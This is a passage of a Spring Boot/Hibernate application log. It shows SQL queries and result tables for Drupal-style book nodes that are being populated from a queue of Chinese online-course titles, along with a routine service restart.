field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.650 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |2           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:55:53.652 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:55:53.653 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|2         |book   |                    |0     |full_html            |zh-hans  |2           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:55:53.655 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.655 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |2           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:55:53.657 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.657 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|2         |book   |0     |zh-hans  |2           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:55:53.659 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.659 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |2           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:55:53.661 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:55:53.661 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |2           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:55:53.664 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:55:53.664 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |2           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:58:46.993 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:598 - Closing JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:58:46.994 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:218 - Shutting down ExecutorService 'applicationTaskExecutor'
2020-11-19 10:58:46.995 INFO  com.zaxxer.hikari.HikariDataSource Line:350 - HikariPool-1 - Shutdown initiated...
2020-11-19 10:58:47.006 INFO  com.zaxxer.hikari.HikariDataSource Line:352 - HikariPool-1 - Shutdown completed.
2020-11-19 10:59:03.370 INFO  geek.me.javaapi.JavaApiApplication Line:651 - No active profile set, falling back to default profiles: default
2020-11-19 10:59:03.734 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:127 - Bootstrapping Spring Data JPA repositories in DEFERRED mode.
2020-11-19 10:59:03.815 INFO  org.springframework.data.repository.config.RepositoryConfigurationDelegate Line:187 - Finished Spring Data repository scanning in 74ms. Found 19 JPA repository interfaces.
2020-11-19 10:59:03.937 INFO  org.springframework.cloud.context.scope.GenericScope Line:295 - BeanFactory id=712cf88e-c083-3907-88de-02f90b8f246d
2020-11-19 10:59:04.234 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:108 - Tomcat initialized with port(s): 8080 (http)
2020-11-19 10:59:04.241 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Initializing ProtocolHandler ["http-nio-8080"]
2020-11-19 10:59:04.241 INFO  org.apache.catalina.core.StandardService Line:173 - Starting service [Tomcat]
2020-11-19 10:59:04.242 INFO  org.apache.catalina.core.StandardEngine Line:173 - Starting Servlet engine: [Apache Tomcat/9.0.37]
2020-11-19 10:59:04.317 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring embedded WebApplicationContext
2020-11-19 10:59:04.318 INFO  org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext Line:285 - Root WebApplicationContext: initialization completed in 935 ms
2020-11-19 10:59:04.452 INFO  org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor Line:181 - Initializing ExecutorService 'applicationTaskExecutor'
2020-11-19 10:59:04.458 INFO  com.zaxxer.hikari.HikariDataSource Line:110 - HikariPool-1 - Starting...
2020-11-19 10:59:04.569 INFO  com.zaxxer.hikari.HikariDataSource Line:123 - HikariPool-1 - Start completed.
2020-11-19 10:59:04.662 INFO  org.hibernate.jpa.internal.util.LogHelper Line:31  - HHH000204: Processing PersistenceUnitInfo [name: default]
2020-11-19 10:59:04.708 INFO  org.hibernate.Version Line:44  - HHH000412: Hibernate ORM core version 5.4.20.Final
2020-11-19 10:59:04.824 INFO  org.hibernate.annotations.common.Version Line:49  - HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2020-11-19 10:59:04.921 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:59:04.925 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:59:04.937 INFO  org.hibernate.dialect.Dialect Line:170 - HHH000400: Using dialect: org.hibernate.dialect.MySQL55Dialect
2020-11-19 10:59:05.553 INFO  org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator Line:52  - HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2020-11-19 10:59:05.560 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:416 - Initialized JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:59:06.378 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:59:06.443 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Starting ProtocolHandler ["http-nio-8080"]
2020-11-19 10:59:06.460 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:220 - Tomcat started on port(s): 8080 (http) with context path ''
2020-11-19 10:59:06.542 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2020-11-19 10:59:06.542 INFO  org.springframework.web.servlet.DispatcherServlet Line:525 - Initializing Servlet 'dispatcherServlet'
2020-11-19 10:59:06.548 INFO  org.springframework.web.servlet.DispatcherServlet Line:547 - Completed initialization in 5 ms
2020-11-19 10:59:07.564 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:59:07.569 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:49  - Triggering deferred initialization of Spring Data repositories…
2020-11-19 10:59:08.102 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:53  - Spring Data repositories initialized!
2020-11-19 10:59:08.107 INFO  geek.me.javaapi.JavaApiApplication Line:61  - Started JavaApiApplication in 7.596 seconds (JVM running for 8.442)
2020-11-19 10:59:30.656 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_, queueentit0_.base_path as base_pat2_18_, queueentit0_.name 
as name3_18_, queueentit0_.todo as todo4_18_ from queue_new queueentit0_ where queueentit0_.todo=1 
 {executed in 0 msec}
2020-11-19 10:59:30.671 INFO  jdbc.resultsettable Line:610 - 
|-----------------|-------------------------------|--------------------|-----|
|item_id          |base_path                      |name                |todo |
|-----------------|-------------------------------|--------------------|-----|
|283828550600385  |00-资源文件/14-极客时间/01-专栏课/051-99/ |87-全栈工程师修炼指南        |1    |
|300655922831157  |00-资源文件/14-极客时间/01-专栏课/051-99/ |52-透视HTTP协议         |1    |
|390535478164697  |00-资源文件/14-极客时间/01-专栏课/051-99/ |51-白话法律42讲          |1    |
|409602706903658  |00-资源文件/14-极客时间/01-专栏课/051-99/ |77-从0打造音视频直播系统      |1    |
|459081746926346  |00-资源文件/14-极客时间/01-专栏课/051-99/ |99-JavaScript核心原理解析 |1    |
|476330106989327  |00-资源文件/14-极客时间/01-专栏课/051-99/ |88-高并发系统设计40问       |1    |
|621195835058382  |00-资源文件/14-极客时间/01-专栏课/051-99/ |97-项目管理实战20讲        |1    |
|626896109933850  |00-资源文件/14-极客时间/01-专栏课/051-99/ |98-设计模式之美           |1    |
|773737007105338  |00-资源文件/14-极客时间/01-专栏课/051-99/ |53-OpenResty从入门到实战  |1    |
|781941951179116  |00-资源文件/14-极客时间/01-专栏课/051-99/ |75-编辑训练营            |1    |
|787964344536295  |00-资源文件/14-极客时间/01-专栏课/051-99/ |80-网络编程实战           |1    |
|789557280998655  |00-资源文件/14-极客时间/01-专栏课/051-99/ |86-即时消息技术剖析与实战      |1    |
|823812106395779  |00-资源文件/14-极客时间/01-专栏课/051-99/ |74-Flutter核心技术与实战   |1    |
|855137735533744  |00-资源文件/14-极客时间/01-专栏课/051-99/ |94-DDD实战课           |1    |
|861073733380654  |00-资源文件/14-极客时间/01-专栏课/051-99/ |90-分布式技术原理与算法解析     |1    |
|876595205877896  |00-资源文件/14-极客时间/01-专栏课/051-99/ |91-说透中台             |1    |
|877479874575179  |00-资源文件/14-极客时间/01-专栏课/051-99/ |83-编译原理之美           |1    |
|936433950782588  |00-资源文件/14-极客时间/01-专栏课/051-99/ |95-苏杰的产品创新课         |1    |
|952316731239648  |00-资源文件/14-极客时间/01-专栏课/051-99/ |92-DevOps实战笔记       |1    |
|954967934009220  |00-资源文件/14-极客时间/01-专栏课/051-99/ |73-黄勇的OKR实战笔记       |1    |
|1004252009859251 |00-资源文件/14-极客时间/01-专栏课/051-99/ |85-研发效率破局之道         |1    |
|1009872364102685 |00-资源文件/14-极客时间/01-专栏课/051-99/ |81-浏览器工作原理与实践       |1    |
|1022101157981678 |00-资源文件/14-极客时间/01-专栏课/051-99/ |79-消息队列高手课          |1    |
|-----------------|-------------------------------|--------------------|-----|

2020-11-19 10:59:40.606 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='283828550600385' 
 {executed in 1 msec}
2020-11-19 10:59:40.607 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|1         |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:59:40.611 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:59:40.612 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|1   |zh-hans  |book |4bb8e624-5f97-4aae-b6e2-3b2e1b596579 |1   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:59:40.641 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:59:40.641 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |283828550600385  |zh-hans  |1           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:59:40.645 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:59:40.646 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|1   |1   |1     |1            |1  |0  |0  |0  |0  |0   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:59:40.652 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.653 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|1         |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:59:40.657 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.658 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |1           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:59:40.664 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:59:40.665 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|1   |1605754552 |1605754552 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |book |1   |1   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:59:40.669 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:59:40.670 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754552 |1605754552 |1                |zh-hans  |0       |1                             |1      |0      |87-全栈工程师修炼指南 |1   |1   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:59:40.676 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754780, created=1605754780, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', type='book', 
uid=1, vid=1 where nid=1 
 {executed in 0 msec}
2020-11-19 10:59:40.678 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754780, created=1605754780, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='87-全栈工程师修炼指南', 
uid=1, vid=1 where nid=1 
 {executed in 1 msec}
2020-11-19 10:59:40.689 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.690 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|1         |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:59:40.696 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.696 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |1           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:59:40.700 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.700 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|1         |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:59:40.705 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:59:40.706 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |1           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:59:40.709 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:59:40.710 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|1         |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:59:40.716 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.716 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:59:40.720 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:59:40.721 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |1           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:59:40.726 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:59:40.727 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |1           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:59:42.011 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='568347143558516' 
 {executed in 1 msec}
2020-11-19 10:59:42.013 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|2         |book   |0     |568347143558516  |zh-hans  |2           |
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:59:42.017 INFO  jdbc.sqltiming Line:373 - select nodeentity0_.nid as nid1_2_, nodeentity0_.langcode as langcode2_2_, nodeentity0_.type 
as type3_2_, nodeentity0_.uuid as uuid4_2_, nodeentity0_.vid as vid5_2_ from node nodeentity0_ 
where nodeentity0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:59:42.019 INFO  jdbc.resultsettable Line:610 - 
|----|---------|-----|-------------------------------------|----|
|nid |langcode |type |uuid                                 |vid |
|----|---------|-----|-------------------------------------|----|
|2   |zh-hans  |book |d915ec1c-b08c-4c6a-ae15-dd21d3de8ea1 |2   |
|----|---------|-----|-------------------------------------|----|

2020-11-19 10:59:42.026 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:59:42.027 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|[unread]  |book   |0     |568347143558516  |zh-hans  |2           |
